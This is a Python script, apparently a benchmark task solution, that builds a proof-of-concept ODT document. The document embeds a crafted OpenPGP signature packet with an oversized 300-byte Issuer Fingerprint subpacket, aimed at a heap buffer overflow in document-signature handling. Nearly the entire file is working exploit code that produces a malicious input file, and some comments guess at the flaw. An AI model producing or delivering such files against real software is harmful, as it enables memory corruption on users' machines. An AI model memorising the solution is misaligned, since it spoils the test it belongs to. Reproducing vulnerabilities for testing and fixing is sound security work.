import io
import zipfile
import struct
import base64

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC ODT file that triggers a heap buffer overflow in the OpenPGP fingerprint writing code.
        The PoC constructs a malicious OpenPGP signature packet with a crafted 'Issuer Fingerprint' subpacket
        that is larger than expected, causing the vulnerable code to overflow a heap buffer.
        """
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as z:
            # 1. mimetype (must be first and uncompressed)
            z.writestr('mimetype', 'application/vnd.oasis.opendocument.text', compress_type=zipfile.ZIP_STORED)
            
            # 2. META-INF/manifest.xml
            manifest = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">\n'
                ' <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>\n'
                ' <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>\n'
                ' <manifest:file-entry manifest:full-path="META-INF/documentsignatures.xml" manifest:media-type="text/xml"/>\n'
                '</manifest:manifest>'
            )
            z.writestr('META-INF/manifest.xml', manifest)

            # 3. content.xml
            content = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
                'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2">\n'
                ' <office:body>\n'
                '  <office:text>\n'
                '   <text:p>PoC</text:p>\n'
                '  </office:text>\n'
                ' </office:body>\n'
                '</office:document-content>'
            )
            z.writestr('content.xml', content)

            # 4. Construct malicious OpenPGP signature packet
            # We construct a V4 Signature Packet. 
            # To trigger the overflow in fingerprint writing, we inject an 'Issuer Fingerprint' subpacket (Type 33)
            # that is larger than the standard buffer (usually 20 bytes for SHA-1).
            # The vulnerability implies that the code doesn't validate the length of the fingerprint subpacket
            # before copying it, or fails to handle a "failure" state correctly but continues to write.
            
            # Create a subpacket with 300 bytes of data.
            # Total subpacket length = 300 (data) + 1 (type byte) = 301.
            # Encoding length 301 in OpenPGP (2-byte encoding):
            # Value = ((1st_octet - 192) << 8) + (2nd_octet) + 192
            # 301 = ((192 - 192) << 8) + 109 + 192
            # 1st octet = 192 (0xC0)
            # 2nd octet = 109 (0x6D)
            
            sp_len_encoded = b'\xC0\x6D'
            sp_type = b'\x21' # Type 33: Issuer Fingerprint
            sp_data = b'A' * 300
            hashed_subpacket = sp_len_encoded + sp_type + sp_data
            
            hashed_sp_len = struct.pack('>H', len(hashed_subpacket))
            unhashed_sp_len = b'\x00\x00'
            hash_left = b'\x00\x00'
            
            # Dummy RSA signature (MPI: len + data). 
            # 1024 bits = 128 bytes.
            mpi = struct.pack('>H', 1024) + (b'\x00' * 128)
            
            # Signature Packet Body (V4)
            body = (b'\x04' +       # Version 4
                    b'\x00' +       # Sig Type: Binary Document
                    b'\x01' +       # Pub Key Algo: RSA
                    b'\x02' +       # Hash Algo: SHA1
                    hashed_sp_len + hashed_subpacket +
                    unhashed_sp_len + hash_left +
                    mpi)
            
            # Packet Header: Tag 2 (Signature). Old format with 2-byte length.
            # Tag 2 (0x02) << 2 = 0x08.
            # Old format header byte: 0x80 | 0x08 | 0x01 (2 byte len) = 0x89.
            header = b'\x89' + struct.pack('>H', len(body))
            pgp_packet = header + body
            
            b64_packet = base64.b64encode(pgp_packet).decode('ascii')

            # 5. META-INF/documentsignatures.xml
            signatures = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<document-signatures xmlns="urn:oasis:names:tc:opendocument:xmlns:digitalsignature:1.0">\n'
                ' <Signature xmlns="http://www.w3.org/2000/09/xmldsig#" Id="Signature1">\n'
                '  <SignedInfo>\n'
                '   <CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>\n'
                '   <SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>\n'
                '   <Reference URI="content.xml">\n'
                '    <Transforms>\n'
                '     <Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>\n'
                '    </Transforms>\n'
                '    <DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>\n'
                '    <DigestValue>x</DigestValue>\n'
                '   </Reference>\n'
                '  </SignedInfo>\n'
                '  <SignatureValue>x</SignatureValue>\n'
                '  <KeyInfo>\n'
                '   <PgpData>\n'
                f'    <PgpKeyPacket>{b64_packet}</PgpKeyPacket>\n'
                '   </PgpData>\n'
                '  </KeyInfo>\n'
                ' </Signature>\n'
                '</document-signatures>'
            )
            z.writestr('META-INF/documentsignatures.xml', signatures)
            
        return bio.getvalue()
